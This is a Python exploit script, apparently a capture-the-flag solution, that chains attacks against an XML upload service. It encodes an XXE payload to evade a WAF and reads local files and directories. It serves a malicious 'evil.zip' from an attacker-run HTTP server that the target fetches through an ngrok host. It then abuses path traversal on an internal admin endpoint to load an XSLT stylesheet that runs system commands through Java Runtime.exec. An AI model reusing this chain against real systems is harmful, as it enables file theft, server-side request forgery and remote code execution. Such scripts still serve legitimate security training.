
import time
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer
import requests
import re
import functools


BASE_XXE = "<!ENTITY data SYSTEM '%s'>"
INVENTORY_XML = """<?xml version="1.0" encoding="UTF-8"?>
%s
<inventory>
    <item>
        <id>1</id>
        <name>&data;</name>
        <model>WRT-1121</model>
        <quantity>300</quantity>
        <price>0.10</price>
    </item>
</inventory>"""



class XLSTHandler(SimpleHTTPRequestHandler):

    def __init__(self, *args, payload="", request_callback: lambda: None, **kwargs):
        print("[*] Init handler")
        self.payload = payload
        self.request_callback = request_callback

        super(XLSTHandler, self).__init__(*args, **kwargs)

    def do_GET(self):
        print("[*] Getting evil.zip")
        self.send_response(200)
        self.send_header('Content-type', 'application/zip')
        self.send_header('Content-Disposition', 'attachment; filename="evil.zip"')
        self.end_headers()
        self.wfile.write(self.payload.encode())
        self.wfile.flush()
        print("[*] Sleep for 5 seconds")
        time.sleep(5)
        print("[*] Calling callback")
        self.request_callback()

    def log_message(self, format, *args):
        pass


class Challenge:

    def __init__(self, lhost, rhost, https=False):
        self.url = lhost
        self.rhost = rhost
        self.https = https

    def _(self, path, url=None, https=None):
        url = url or self.url
        https = https or self.https

        return f"http{'s' if https else ''}://{url}/{path}"

    
    def xxe(self, payload):
        bypass_waf =  ''.join([r'&#x%x;' % ord(char) for char in payload])
        
        return INVENTORY_XML % f"""<!DOCTYPE foo [
            <!ENTITY % xxe "{bypass_waf}"> %xxe;
        ]>"""

    def _upload(self, file):
        res = requests.post(self._('upload'), files={'attachment': ('inventory.xml', file)})
        assert res.status_code == 200, res.text

        res = requests.get(self._('download'))
        assert res.status_code == 200, res.text
        return res.text.split("<name>")[1].split("</name>")[0]

    def ls(self, dir):
        payload = self.xxe(BASE_XXE % f"file://{dir}")
        return self._upload(payload)
    
    def echo_and_touch(self, content):
        
        def callback():
            print("[*] Payload uploaded")
            ls = self.ls("/tmp")
            match = re.findall(r'jar_\S*', ls)
            assert len(match) >= 1, f"Found {len(match)} files: {match}"
            file = match[0]

            admin_url = self._("admin?template-name=../../../../tmp/%s" % file, '127.0.0.1:6060', https=False)
            print(f"[*] Admin URL: {admin_url}")

            flag = self._upload(
                self.xxe(BASE_XXE % admin_url)
            )

            print(f"[*] Flag: {flag}")

        def upload():
            print("[*] Wait for server")
            time.sleep(5)
            print("[*] Serving evil.zip")
            self._upload(
                self.xxe(BASE_XXE % f"jar:https://{self.rhost}/evil.zip!/malicious_template.xsl")
            )

        httpd = HTTPServer(
            ('', 8000),
            functools.partial(XLSTHandler, payload=content, request_callback=callback)
        )

        t = threading.Thread(target=upload)
        t.daemon = True
        t.start()
        
        print("[*] Handle request")
        httpd.handle_request()



c = Challenge(f"localhost:6060", "8b86-109-115-77-173.ngrok-free.app")
c.echo_and_touch("""<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:date="http://xml.apache.org/xalan/java/java.util.Date"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                xmlns:str="http://xml.apache.org/xalan/java/java.lang.String"
                exclude-result-prefixes="date">

    <xsl:output method="text"/>
    <xsl:template match="/">

        <xsl:variable name="cmd"><![CDATA[cat_flag]]></xsl:variable>
        <xsl:variable name="rtObj" select="rt:getRuntime()"/>
        <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
        <xsl:variable name="efgh" select="jv:getInputStream($process)" xmlns:jv="http://xml.apache.org/xalan/java"/>
        <xsl:variable name="ijkl" select="isr:new($efgh)" xmlns:isr="http://xml.apache.org/xalan/java/java.io.InputStreamReader"/>
        <xsl:variable name="mnop" select="br:new($ijkl)" xmlns:br="http://xml.apache.org/xalan/java/java.io.BufferedReader"/>
        <xsl:value-of select="jv:readLine($mnop)" xmlns:jv="http://xml.apache.org/xalan/java"/>
        <xsl:value-of select="jv:readLine($mnop)" xmlns:jv="http://xml.apache.org/xalan/java"/>

    </xsl:template>
</xsl:stylesheet>              
""")
